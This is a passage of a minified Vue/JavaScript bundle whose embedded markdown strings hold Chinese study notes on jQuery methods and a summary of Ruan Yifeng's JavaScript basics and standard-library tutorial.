$(’li‘).children(‘p’)\r\n\r\n- 3.后代级\r\n\r\n\t- $('li').find('p')\r\n\r\n- 4.兄弟\r\n\r\n\t- $('li').siblings()\r\n\r\n- 5.前面兄弟\r\n\r\n\t- $('li c4').nextAll()\r\n\r\n- 6.后面兄弟\r\n\r\n\t- $('li c4').prveAll()\r\n\r\n- 7.判断某个元素是否有哪个类名(返回值booleqan)\r\n\r\n\t-  $('li').hasClass('c2')   \r\n\r\n- 8.指定索引方法【推荐】\r\n\r\n\t- $('li').eq(2)\r\n\r\n## 7.样式操作\r\n\r\n### 1.直接操作\r\n\r\n- 单一操作\r\n\r\n\t- $(‘div’).css('width',100)\r\n\r\n- 多种样式一起改变（传入对象）\r\n\r\n\t- $('div').css({\r\n\twidth:200,\r\n\theight:200,\r\n})\r\n\r\n### 2.类名操作\r\n\r\n- 1.添加\r\n\r\n\t- $('div').addCLass(‘类名’)\r\n\r\n- 2.删除\r\n\r\n\t- $('div').removeCLass(‘类名’)\r\n\r\n- 3.切换\r\n\r\n\t- $('div').toggleClassCLass(‘类名’)\r\n\r\n## 8.效果\r\n\r\n### 1.显示隐藏（三个参数均可以省略）\r\n\r\n- 1.显示\r\n\r\n\t- show('时间','切换效果','回调函数')\r\n\r\n- 2.隐藏\r\n\r\n\t- hide('时间','切换效果','回调函数')\r\n\r\n- 3.切换\r\n\r\n\t- toggle('时间','切换效果','回调函数')\r\n\r\n### 2.滑动效果（三个参数均可以省略）\r\n\r\n- 1.向下滑\r\n\r\n\t- slideDown('时间','切换效果','回调函数')\r\n\r\n- 2.向上滑\r\n\r\n\t- slideUp('时间','切换效果','回调函数')\r\n\r\n- 3.切换\r\n\r\n\t- slideToggle('时间','切换效果','回调函数')\r\n\r\n### 3.事件切换\r\n\r\n- hover（function（），function（））\r\n\r\n\t- 1.第一个参数，鼠标进入\r\n\t- 2.第二个参数，鼠标移除\r\n\t- 注意：如果参数只写一个，则鼠标进入和离开的时候都会触发他\r\n\t- (不支持冒泡)mouseencter <==> mouseover（支持冒泡）\r\n\t- （不支持冒泡）mouseleave <==> mouseout（支持冒泡）\r\n\r\n### 4.淡入淡出效果\r\n\r\n- 1.淡入\r\n\r\n\t- fadeIn('时间','切换效果','回调函数')\r\n\r\n- 2.淡出\r\n\r\n\t- fadeOut('时间','切换效果','回调函数')\r\n\r\n- 3.切换\r\n\r\n\t- fadeToggle('时间','切换效果','回调函数')\r\n\r\n- 4.淡入/出到某个程度\r\n\r\n\t- fadeTo('时间','透明度','切换效果','回调函数')  ====>前两个参数必须写\r\n\r\n### 5.自定义动画\r\n\r\n- animate('params','速度','切换效果','回调函数')\r\n\r\n\t- params(更改的样式)\r\n\r\n\t\t- 1.必须写\r\n\t\t- 2.对象形式\r\n\t\t- 3.不可以设置颜色\r\n\r\n### 6.动画队列及其停止排队方法\r\n\r\n- stop()\r\n\r\n## 9.jQuery尺寸\r\n\r\n### width（）；\r\n\r\n### height （）；\r\n\r\n### innerWidth（）；\r\n\r\n### innerHeight();\r\n\r\n### outerWidth();\r\n\r\n### outerHeight();\r\n\r\n### outerWidth(true);\r\n\r\n### outerHeight(true);\r\n\r\n## 10.jQuery位置\r\n\r\n### 1.offset（）；\r\n\r\n- 1.距离文档的距离\r\n- 2.返回值是一个对象\r\n- 3.可以设置\r\n\r\n### 2.position（）\r\n\r\n- 1.距离带有定位父元素的距离\r\n- 2.返回值是一个对象\r\n- 3.不可以设置\r\n\r\n### 3.scrollTop();\r\n\r\n- 卷起上部分的距离\r\n\r\n### 4.scrollLeft();\r\n\r\n- 卷据做部分的距离\r\n\r\n## 11.jQuery事件\r\n\r\n### 1.事件注册\r\n\r\n- element.事件（function(){}）\r\n\r\n### 2.绑定事件\r\n\r\n- on的方式\r\n\r\n\t- 1.element.on（‘事件’，‘元素’，‘fn’）\r\n\t- 2.element.on（{\r\n\tclick:function(){},\r\n    mouseover:function(){}\r\n}）\r\n\r\n\t\t- 优势:1.可以绑定多个事件，多个处理事件处理程序\r\n       2.可以完成事件委派（委托）\r\n       3.动态添加的元素也享有事件，需要事件委派\r\n\r\n\t- 3.element.one('click','fn')\r\n\r\n\t\t- 事件只完成1次\r\n\r\n### 2.解绑事件\r\n\r\n- 1.$('div').off();\r\n\r\n\t- div身上的全部事件解绑\r\n\r\n- 2.$('div').off('click')\r\n\r\n\t- div身上的click事件解绑\r\n\r\n- 3.$('div').off('click','li')\r\n\r\n\t- 解绑事件委托\r\n\r\n### 3.自动触发事件\r\n\r\n- 1.element.click();\r\n- 2.element.tigger('click')\r\n\r\n\t- 自动触发，不需要点击\r\n\r\n- 3.element.tiggerHandler('click');\r\n\r\n\t- 不会触发元素的默认行为\r\n\r\n## 13.事件对象\r\n\r\n### 1.阻止默认行为：\r\n\r\n- 1.event.preventDefault()\r\n- 2.return  false \r\n\r\n### 2.阻止冒泡：\r\n\r\n-  event.stopPropagation()\r\n\r\n",kt={data:function(){return{MainComponent:Tt}}},Ct=kt,jt=Object(u["a"])(Ct,wt,Et,!1,null,"08ba9b72",null),Mt=jt.exports,Rt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Lt=[],Ot="# 阮一峰JavaScript基础总结\r\n\r\n## 阮一峰·JS基 础语法部分\r\n\r\n### 基本语法\r\n\r\n- switch不进行类型转换\r\n\r\n- 三元运算符\r\n\r\n- break与continue语句\r\n\r\n- 标签：Label\r\n\r\n### 数据类型\r\n\r\n- 六种主要数据类型\r\n\r\n\t- 字符串，数值，布尔值，null，undefined，对象\r\n\t- ES6新增Symbol\r\n\r\n- JavaScript确定值类型的三种方法\r\n\r\n\t- typeof运算符\r\n\r\n\t\t- 一共六种类型，注意6，7。对于Array,Null等特殊对象使用typeof一律返回object，这正是typeof的局限性，typeof只能区分值类型的，不能区分引用类型\r\n\t\t- 注意使用typeof得到的六种结果为：number，function，object，string，undefined，boolean\r\n\r\n\t- instanceof运算符\r\n\r\n\t\t- instanceof：用于判断 引用类型 属于哪个构造函数的方法\r\n\t- Object.prototype.toString方法\r\n\r\n- null与undefined\r\n\r\n\t- 区别：null是一个表示“空”的对象，转为数值时为0；undefined是一个表示”此处无定义”的原始值，转为数值时为NaN。\r\n\r\n\t- 用法与含义\r\n\r\n- 布尔值\r\n\r\n\t- 哪些运算符会返回布尔值？\r\n\r\n\t\t- 两元逻辑运算符： && (And)，|| (Or)\r\n\t\t- 前置逻辑运算符： ! (Not)\r\n\t\t- 相等运算符：===，!==，==，!=\r\n\t\t- 比较运算符：>，>=，<，<=\r\n\r\n\t- 转换规则\r\n\r\n\t\t- 除了下面六个值被转为false，其他值都视为true。\r\n\t\t- undefined，null，false，0，NaN，\"\"或''（空字符串）\r\n\r\n### 数值\r\n\r\n- 整数和浮点数\r\n\r\n\t- JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，1与1.0是相同的，是同一个数。\r\n\r\n\t- JavaScript语言底层没有整数\r\n\t- 涉及到小数的比较与运算要特别小心\r\n\r\n- 数值范围\r\n\r\n\t-  JavaScript 能够表示的数值范围为2的1024次方到2的-1023次方（开区间），超出这个范围的数无法表示\r\n\t- 正向溢出\r\n\r\n\t- 负向溢出\r\n\r\n\t- JavaScript 提供Number对象的MAX_VALUE和MIN_VALUE属性，返回可以表示的具体的最大值和最小值。\r\n\r\n\t\t- Number.MAX_VALUE // 1.7976931348623157e+308\r\n\t\t- Number.MIN_VALUE // 5e-324\r\n\r\n- 数值进制\r\n\r\n\t- 十进制：没有前导0的数值。\r\n\t- 八进制：有前缀0o或0O的数值，或者有前导0、且只用到0-7的八个阿拉伯数字的数值。\r\n\t- 十六进制：有前缀0x或0X的数值。\r\n\t- 二进制：有前缀0b或0B的数值。\r\n\r\n- 正负零的唯一区别\r\n\r\n- NaN\r\n\r\n\t- 含义\r\n\r\n\t\t- 数据类型依然属于Number，主要出现在将字符串解析成数字出错的场合。另外，一些数学函数的运算结果会出现NaN。0除以0也会得到NaN。\r\n\r\n\t- 运算规则\r\n\r\n\t\t- NaN不等于任何值，包括它本身。\r\n\t\t- 数组的indexOf方法内部使用的是严格相等运算符，所以该方法对NaN不成立。\r\n\r\n\t\t- NaN在布尔运算时被当作false。\r\n\t\t- NaN与任何数（包括它自己）的运算，得到的都是NaN。\r\n\r\n- 相关方法\r\n\r\n\t- parseInt()\r\n\r\n\t\t- \r\n该方法用于将字符串转为整数。返回值只有两种可能，要么是一个十进制整数，要么是NaN。\r\n\r\n1）如果字符串头部有空格，空格会被自动去除。\r\n\r\n2）如果parseInt的参数不是字符串，则会先转为字符串再转换。\r\n\r\n3）字符串转为整数的时候，是一个个字符依次转换，如果遇到不能转为数字的字符，就不再进行下去，返回已经转好的部分。\r\n\t\t- 对于自动转科学计数法的情况\r\n\r\n\t\t- 进制转换\r\n\r\n\t\t\t- parseInt方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。\r\n\t\t\t- 第一个参数自转字符串引发进制转换的错误\r\n\r\n\t- parseFloat()\r\n\r\n\t\t- \r\n该方法用于将一个字符串转为浮点数。\r\n\t\t- parseFloat()在转化NaN不同于Number()，如果参数不是字符串，或者字符串的第一个字符不能转化为浮点数，则返回NaN。尤其注意！parseFloat会将空字符串转为NaN。\r\n\r\n\t- isNaN()\r\n\r\n\t\t- \r\nisNaN方法可以用来判断一个值是否为NaN。\r\n\t\t- 可以令isNaN()返回true的情况：NaN、字符串、对象、数组\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- 使用isNaN之前，最好判断一下数据类型。\r\n\r\n\t\t\t\t- function myIsNaN(value) {\r\n  return typeof value === 'number' && isNaN(value);\r\n}\r\n\r\n\t\t- 替代\r\n\r\n\t\t\t- 判断isNaN更可靠的方法是，利用NaN为唯一不等于自身的值的这个特点，进行判断。\r\n\r\n\t\t\t\t- function myIsNaN(value) {\r\n  return value !== value;\r\n}\r\n\r\n\t- isFinite()\r\n\r\n\t\t- isFinite方法返回一个布尔值，表示某个值是否为正常的数值。\r\n\t\t- 除了Infinity、-Infinity和NaN这三个值会返回false，isFinite对于其他的数值都会返回true。\r\n\r\n\t\t\t- isFinite(Infinity) // false\r\n\t\t\t- isFinite(-Infinity) // false\r\n\t\t\t- isFinite(NaN) // false\r\n\t\t\t- isFinite(-1) // true\r\n\r\n### 字符串\r\n\r\n- 定义\r\n\r\n\t- 字符串默认只能写在一行内，分成多行将会报错。\r\n\r\n\t- 如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠。\r\n\r\n- 转义\r\n\r\n\t- 反斜杠的特殊用法\r\n\r\n- 字符串与数组的相似性\r\n\r\n\t- 字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符（位置编号从0开始）。\r\n\t- 如果方括号中的数字超过字符串的长度，或者方括号中根本不是数字，则返回undefined。\r\n\r\n- length属性\r\n\r\n\t- length属性返回字符串的长度，该属性也是无法改变的。\r\n\r\n- 字符集\r\n\r\n\t- JavaScript 使用 Unicode 字符集。JavaScript 引擎内部，所有字符都用 Unicode 表示。\r\n\r\nJavaScript 不仅以 Unicode 储存字符，还允许直接在程序中使用 Unicode 码点表示字符，即将字符写成\\uxxxx的形式，其中xxxx代表该字符的 Unicode 码点。比如，\\u00A9代表版权符号。\r\n\t- 对于码点在U+10000到U+10FFFF之间的字符，JavaScript 总是认为它们是两个字符（length属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的。\r\n\r\n- Base64转码\r\n\r\n  有时，文本里面包含一些不可打印的符号，比如 ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。另一个场景是，有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码。\r\n\r\n\t- 定义\r\n\r\n\t\t- \r\n一种编码方法，可以将任意值转成 0～9、A～Z、a-z、+和/这64个字符组成的可打印字符\r\n\r\n\t- 使用目的\r\n\r\n\t\t- 不是为了加密，而是为了不出现特殊字符，简化程序的处理。\r\n\r\n\t- JavaScript 原生提供两个 Base64 相关的方法。\r\n\r\n\t\t- btoa()：任意值转为 Base64 编码\r\n\t\t- atob()：Base64 编码转为原来的值\r\n\t- 注意\r\n\r\n\t\t- 这两个方法不适合非 ASCII 码的字符\r\n\t\t- 要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用这两个方法。\r\n\r\n### 对象\r\n\r\n- 键名\r\n\r\n\t- \r\n如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错。\r\n\r\n- 对象的引用\r\n\r\n\t- 如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。\r\n\r\n\t- 此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。\r\n\r\n- 表达式还是语句\r\n\r\n\t- 如果行首是大括号，一律解释为语句（即代码块）。如果要解释为表达式（即对象），必须在大括号前加上圆括号。\r\n\r\n- 属性的操作\r\n\r\n\t- 属性读取\r\n\r\n\t\t- \r\n请注意，如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理。\r\n\r\n\t\t- 注意，数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符。\r\n\r\n\t- 查看所有属性\r\n\r\n\t\t- 查看一个对象本身的所有属性，可以使用Object.keys方法。\r\n\r\n\t- delete 命令\r\n\r\n\t\t- delete命令用于删除对象的属性，删除成功后返回true。\r\n\r\n\t\t- 注意，删除一个不存在的属性，delete不报错，而且返回true。不能根据delete命令的结果，认定某个属性是存在的。\r\n\r\n\t\t- 只有一种情况，delete命令会返回false，那就是该属性存在，且不得删除。\r\n\r\n\t\t- 需要注意的是，delete命令只能删除对象本身的属性，无法删除继承的属性\r\n\r\n\t- in 运算符\r\n\r\n\t\t- \r\nin运算符用于检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回true\r\n\t\t- in运算符的一个问题是，它不能识别哪些属性是对象自身的，哪些属性是继承的。\r\n\r\n\t- for…in 循环\r\n\r\n\t\t- for...in循环用来遍历一个对象的全部属性。\r\n\r\n\t\t- 注意点\r\n\r\n\t\t\t- 它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性。\r\n\t\t\t- 它不仅遍历对象自身的属性，还遍历继承的属性。\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- 使用for...in的时候，应该结合使用hasOwnProperty方法，在循环内部判断一下，某个属性是否为对象自身的属性。\r\n\r\n\t- with 语句\r\n\r\n\t\t- 作用\r\n\r\n\t\t\t- 操作同一个对象的多个属性时，提供一些书写的方便。\r\n\r\n\t\t- 注意\r\n\r\n\t\t\t- 如果with区块内部有变量的赋值操作，必须是当前对象已经存在的属性，否则会创造一个当前作用域的全局变量。\r\n\r\n### 数组\r\n\r\n- 定义\r\n\r\n\t- 任何类型的数据，都可以放入数组。\r\n\r\n- length 属性\r\n\r\n\t- length属性是可写的。如果人为设置一个小于当前成员个数的值，该数组的成员会自动减少到length设置的值。清空数组的一个有效方法，就是将length属性设为0。\r\n\t- 如果人为设置length大于当前元素个数，则数组的成员数量会增加到这个值，新增的位置都是空位。当length属性设为大于数组个数时，读取新增的位置都会返回undefined\r\n\t- 注意\r\n\r\n\t\t- 由于数组本质上是一种对象，所以可以为数组添加属性，但是这不影响length属性的值。\r\n\r\n- in 运算符\r\n\r\n\t- \r\n检查某个键名是否存在的运算符in，适用于对象，也适用于数组。\r\n\r\n- for…in 循环和数组的遍历\r\n\r\n\t- for...in不仅会遍历数组所有的数字键，还会遍历非数字键。\r\n\t- 不推荐使用for...in遍历数组。数组的遍历可以考虑使用for循环或while循环。\r\n\r\n\t- foreach方法\r\n\r\n\t\t- 数组的forEach方法，也可以用来遍历数组\r\n\r\n- 数组的空位\r\n\r\n\t- 数组的空位在length属性中有体现，并且是可以读取的，返回undefined。\r\n\t- 注意\r\n\r\n\t\t- 数组的某个位置是空位，与某个位置是undefined，是不一样的。如果是空位，使用数组的forEach方法、for...in结构、以及Object.keys方法进行遍历，空位都会被跳过。\r\n\t\t- 如果某个位置是undefined，遍历的时候就不会被跳过。\r\n\r\n- “类似数组的对象”使用数组方法\r\n\r\n\t- 1）数组的slice方法可以将“类似数组的对象”变成真正的数组。\r\n\r\n\t\t- var arr = Array.prototype.slice.call(arrayLike);\r\n\r\n\t- 2）就是通过call()把数组的方法放到对象上面。\r\n\r\n\t  注意，这种方法比直接使用数组原生的forEach要慢，所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的forEach方法。\r\n\r\n### 函数\r\n\r\n- 递归\r\n\r\n\t- 函数可以调用自身，这就是递归（recursion）\r\n\r\n- 变量提升\r\n\r\n\t- 如果同时采用function命令和赋值语句声明同一个函数，最后总是采用赋值语句的定义。\r\n\r\n- 不能在条件语句中声明函数\r\n\r\n\t- 根据 ES5 的规范，不得在非函数的代码块中声明函数，最常见的情况就是if和try语句。\r\n- 函数的属性和方法\r\n\r\n\t- name 属性\r\n\r\n\t\t- 函数的name属性返回函数的名字。\r\n\t\t- 用处\r\n\r\n\t\t\t- name属性的一个用处，就是获取参数函数的名字。\r\n\r\n\t- length 属性\r\n\r\n\t\t- \r\n函数的length属性返回函数预期传入的参数个数，即函数定义之中的参数个数。\r\n\t\t- length属性提供了一种机制，判断定义时和调用时参数的差异，以便实现面向对象编程的”方法重载“\r\n\r\n\t- toString()\r\n\r\n\t\t- \r\n函数的toString方法返回一个字符串，内容是函数的源码。\r\n\r\n- 函数的参数\r\n\r\n\t- 参数的省略\r\n\r\n\t\t- 需要注意的是，函数的length属性与实际传入的参数个数无关，只反映函数预期传入的参数个数。\r\n\t\t- 没有办法只省略靠前的参数，而保留靠后的参数。如果一定要省略靠前的参数，只有显式传入undefined。\r\n\r\n\t- 参数的传递\r\n\r\n\t\t- 原始类型的值（数值、字符串、布尔值），传递方式是传值传递（在函数体内修改参数值，不会影响到函数外部。）\r\n\t\t- 参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（内部修改参数，将会影响到原始值。）\r\n\r\n\t\t- 注意！如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值。\r\n\r\n- arguments 对象\r\n\r\n\t- 定义\r\n\r\n\t\t- \r\n这个对象只有在函数体内部，才可以使用。\r\n\r\n\t- argument.length\r\n\r\n\t\t- 通过arguments对象的length属性，可以判断函数调用时到底带几个参数。\r\n\r\n\t- 与数组的关系\r\n\r\n\t\t- 虽然arguments很像数组，但它是一个对象。数组专有的方法（比如slice和forEach），不能在arguments对象上直接使用。\r\n\t\t- 让argument对象使用数组方法\r\n\r\n\t\t\t- 如果要让arguments对象使用数组方法，真正的解决方法是将arguments转为真正的数组。下面是两种常用的转换方法：slice方法和逐一填入新数组。\r\n\r\n\t- callee 属性\r\n\r\n\t\t- arguments对象带有一个callee属性，返回它所对应的原函数。\r\n- 闭包\r\n\r\n\t- 闭包的作用\r\n\r\n\t\t- 1.读取函数内部的变量，并让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。\r\n\r\n\t\t- 2.封装对象的私有属性和私有方法。\r\n\r\n\t- 注意\r\n\r\n\t\t- 注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。\r\n\r\n- eval 命令\r\n\r\n\t- 定义\r\n\r\n\t\t- eval命令的作用是，将字符串当作语句执行。\r\n\r\n\t- 性质\r\n\r\n\t\t- 放在eval中的字符串，应该有独自存在的意义，不能用来与eval以外的命令配合使用。\r\n\t\t- eval没有自己的作用域，都在当前作用域内执行，因此可能会修改当前作用域的变量的值，造成安全问题。\r\n\r\n\t- 与eval()相类似的\r\n\r\n### 运算符\r\n\r\n- 数值运算符\r\n\r\n\t- 数值运算符的作用在于可以将任何值转为数值（与Number函数的作用相同）。\r\n\r\n- 指数运算符\r\n\r\n- 字符串的比较\r\n\r\n\t- JavaScript 引擎内部首先比较字符串中首字符的 Unicode 码点。如果相等，再比较第二个字符的 Unicode 码点，以此类推。\r\n\r\n- 非字符串的比较\r\n\r\n\t- （1）原始类型的值\r\n\r\n\t\t- 先转成数值再比较。\r\n\r\n\t- （2）对象\r\n\r\n\t\t- 如果运算子是对象，会转为原始类型的值，再进行比较。\r\n\t\t- 对象转换成原始类型的值，算法是先调用valueOf方法；如果返回的还是对象，再接着调用toString方法，\r\n\r\n\t- （3）undefined == null // true;  undefined === null //false\r\n\r\n- 且运算符（&&）\r\n\r\n\t- 运算规则\r\n\r\n\t\t- 如果第一个运算子的布尔值为true，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为false，则直接返回第一个运算子的值，且不再对第二个运算子求值。\r\n\r\n\t- 取代if结构\r\n\r\n\t- 多个连用\r\n\r\n\t\t- 且运算符可以多个连用，这时返回第一个布尔值为false的表达式的值。\r\n- 或运算符（||）\r\n\r\n\t- 或运算符常用于为一个变量设置默认值。\r\n- 逗号运算符\r\n\r\n\t- 逗号运算符用于对两个表达式求值，并返回后一个表达式的值。\r\n### 数据类型转换\r\n\r\n- 强制转换\r\n\r\n\t- Number()\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- 使用Number函数，可以将任意类型的值转化成数值。\r\n\r\n\t\t- 参数为原始类型的值\r\n\r\n\t\t\t- 只要有一个字符无法转成数值，整个字符串就会被转为NaN。\r\n\t\t- 参数为对象\r\n\r\n\t\t\t- Number方法的参数是对象时，将返回NaN，除非是包含单个数值的数组。\r\n\r\n\t- String()\r\n\r\n\t\t- （1）原始类型值\r\n\r\n\t\t\t- 数值：转为相应的字符串。\r\n\t\t\t- 字符串：转换后还是原来的值。\r\n\t\t\t- 布尔值：true转为字符串\"true\"，false转为字符串\"false\"。\r\n\t\t\t- undefined：转为字符串\"undefined\"。\r\n\t\t\t- null：转为字符串\"null\"。\r\n\r\n\t\t- （2）对象\r\n\r\n\t\t\t- String方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式。\r\n\r\n\t- Boolean()\r\n\r\n\t\t- 除了以下五个值的转换结果为false，其他的值全部为true。\r\n\r\n\t\t\t- undefined\r\n\t\t\t- null\r\n\t\t\t- -0或+0\r\n\t\t\t- NaN\r\n\t\t\t- ''（空字符串）\r\n\r\n\t\t- 注意\r\n\r\n\t\t\t- 所有对象（包括空对象）的转换结果都是true，甚至连false对应的布尔对象new Boolean(false)也是true\r\n- 自动转换\r\n\r\n\t- !! expression\r\n\r\n- 对象类型转换\r\n\r\n\t- valueOf（）\r\n\r\n\t- toString（）\r\n\r\n### 错误处理机制\r\n\r\n- Error 实例对象\r\n\r\n\t- message属性：错误提示信息\r\n\t- name属性：错误名称（非标准属性）\r\n\t- stack属性：错误的堆栈（非标准属性）\r\n\r\n- Error的6个派生对象\r\n\r\n\t- SyntaxError 对象\r\n\r\n\t\t- SyntaxError对象是解析代码时发生的语法错误。\r\n\r\n\t- ReferenceError 对象\r\n\r\n\t\t- ReferenceError对象是引用一个不存在的变量时发生的错误。\r\n\t\t- 另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果或者this赋值。\r\n\r\n\t- RangeError 对象\r\n\r\n\t\t- RangeError对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是Number对象的方法参数超出范围，以及函数堆栈超过最大值。\r\n\r\n\t- TypeError 对象\r\n\r\n\t\t- TypeError对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用new命令，就会抛出这种错误，因为new命令的参数应该是一个构造函数。\r\n\r\n\t- URIError 对象\r\n\r\n\t\t- URIError对象是 URI 相关函数的参数不正确时抛出的错误，主要涉及encodeURI()、decodeURI()、encodeURIComponent()、decodeURIComponent()、escape()和unescape()这六个函数。\r\n\r\n\t- EvalError 对象\r\n\r\n\t\t- eval函数没有被正确执行时，会抛出EvalError错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。\r\n\r\n- throw 语句\r\n\r\n\t- 定义\r\n\r\n\t\t- throw语句的作用是手动中断程序执行，抛出一个错误。实际上，throw可以抛出任何类型的值。也就是说，它的参数可以是任何值\r\n\r\n- try…catch 结构\r\n\r\n\t- 定义\r\n\r\n\t\t- try代码块抛出错误（上例用的是throw语句），JavaScript 引擎就立即把代码的执行，转到catch代码块，或者说错误被catch代码块捕获了。catch接受一个参数，表示try代码块抛出的值。\r\n\r\n## 阮一峰·JS标 准库\r\n\r\n### Object对象\r\n\r\n- 概述\r\n\r\n\t- JavaScript 的所有其他对象都继承自Object对象，即那些对象都是Object的实例。\r\n\t- Object对象的原生方法\r\n\r\n\t\t- Object本身的方法（静态方法）\r\n\r\n\t\t- Object的实例方法。\r\n\r\n- Object作为函数的用法：Object()\r\n\r\n\t- Object作为工具函数\r\n\r\n\t\t- 如果参数是原始类型的值，Object方法将其转为对应的包装对象的实例\r\n\r\n\t\t- 如果Object方法的参数是一个对象，它总是返回该对象，即不用转换。\r\n\r\n\t\t\t- 利用这一点，可以写一个判断变量是否为对象的函数。\r\n\t- Object 作为构造函数\r\n\r\n\t\t- Object构造函数的首要用途，是直接通过它来生成新对象，通过var obj = new Object()的写法生成新对象，与字面量的写法var obj = {}是等价的。\r\n\t\t- 与其作为工具函数的用法相似，但是Object(value)与new Object(value)两者的语义是不同的，Object(value)表示将value转成一个对象，new Object(value)则表示新生成一个对象，它的值是value。\r\n\r\n- Object 的静态方法\r\n\r\n\t- （0）遍历对象的属性的两种方法\r\n\r\n\t\t- Object.keys方法只返回可枚举的属性，Object.getOwnPropertyNames方法还返回不可枚举的属性名。\r\n\r\n\t- （1）对象属性模型的相关方法\r\n\r\n\t\t- Object.getOwnPropertyDescriptor()：获取某个属性的描述对象。\r\n\t\t- Object.defineProperty()：通过描述对象，定义某个属性。\r\n\t\t- Object.defineProperties()：通过描述对象，定义多个属性。\r\n\r\n\t- （2）控制对象状态的方法\r\n\r\n\t\t- Object.preventExtensions()：防止对象扩展。\r\n\t\t- Object.isExtensible()：判断对象是否可扩展。\r\n\t\t- Object.seal()：禁止对象配置。\r\n\t\t- Object.isSealed()：判断一个对象是否可配置。\r\n\t\t- Object.freeze()：冻结一个对象。\r\n\t\t- Object.isFrozen()：判断一个对象是否被冻结。\r\n\r\n\t- （3）原型链相关方法\r\n\r\n\t\t- Object.create()：该方法可以指定原型对象和属性，返回一个新的对象。\r\n\t\t- Object.getPrototypeOf()：获取对象的Prototype对象。\r\n\r\n- Object 的实例方法\r\n\r\n\t- Object.prototype.valueOf()：返回当前对象对应的值。\r\n\r\n\t\t- valueOf方法的作用是返回一个对象的“值”，默认情况下返回对象本身。\r\n\t- Object.prototype.toString()：返回当前对象对应的字符串形式。\r\n\r\n\t\t- toString方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串。\r\n\r\n\t\t- 数组、字符串、函数、Date 对象都分别部署了自定义的toString方法，覆盖了Object.prototype.toString方法。\r\n\r\n\t\t- toString() 的应用：判断数据类型\r\n\r\n\t\t\t- 概述\r\n\r\n\t\t\t- 应用\r\n\r\n\t\t\t- 不同数据类型的Object.prototype.toString方法返回值如下。即利用这个特性可以做一个准确的类型判断。\r\n\r\n\t\t\t\t- 数值：返回[object Number]。\r\n\t\t\t\t- 字符串：返回[object String]。\r\n\t\t\t\t- 布尔值：返回[object Boolean]。\r\n\t\t\t\t- undefined：返回[object Undefined]。\r\n\t\t\t\t- null：返回[object Null]。\r\n\t\t\t\t- 数组：返回[object Array]。\r\n\t\t\t\t- arguments 对象：返回[object Arguments]。\r\n\t\t\t\t- 函数：返回[object Function]。\r\n\t\t\t\t- Error 对象：返回[object Error]。\r\n\t\t\t\t- Date 对象：返回[object Date]。\r\n\t\t\t\t- RegExp 对象：返回[object RegExp]。\r\n\t\t\t\t- 其他对象：返回[object Object]。\r\n\r\n\t- Object.prototype.toLocaleString()：返回当前对象对应的本地字符串形式。\r\n\r\n\t\t- Array.prototype.toLocaleString()\r\n\t\t- Number.prototype.toLocaleString()\r\n\t\t- Date.prototype.toLocaleString()\r\n\r\n\t- Object.prototype.hasOwnProperty()：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。\r\n\r\n\t\t- Object.prototype.hasOwnProperty方法接受一个字符串作为参数，返回一个布尔值，表示该实例对象自身是否具有该属性。\r\n\t- Object.prototype.isPrototypeOf()：判断当前对象是否为另一个对象的原型。\r\n\t- Object.prototype.propertyIsEnumerable()：判断某个属性是否可枚举。\r\n\r\n### Array 对象\r\n\r\n- 作为构造函数\r\n\r\n\t- Array构造函数有一个很大的缺陷，就是不同的参数，会导致它的行为不一致。\r\n\r\n\t- 不建议使用它生成新数组，直接使用数组字面量是更好的做法。\r\n\r\n\t\t- var arr = new Array(1, 2); // bad\r\n\t\t- var arr = [1, 2]; // good\r\n\r\n- 静态方法\r\n\r\n\t- Array.isArray()\r\n\r\n\t\t- Array.isArray方法返回一个布尔值，表示参数是否为数组。它可以弥补typeof运算符的不足\r\n- 实例方法\r\n\r\n\t- valueOf()，toString()\r\n\t- push()，pop()\r\n\r\n\t\t- push方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。\r\n\r\n\t\t- pop方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组\r\n\r\n\t\t- 对空数组使用pop方法，不会报错，而是返回undefined。\r\n\r\n\t\t- push和pop结合使用，就构成了“后进先出”的栈结构（stack）。\r\n\r\n\t- shift()，unshift()\r\n\r\n\t\t- shift方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组。\r\n\r\n\t\t- shift方法可以遍历并清空一个数组。\r\n\r\n\t\t- 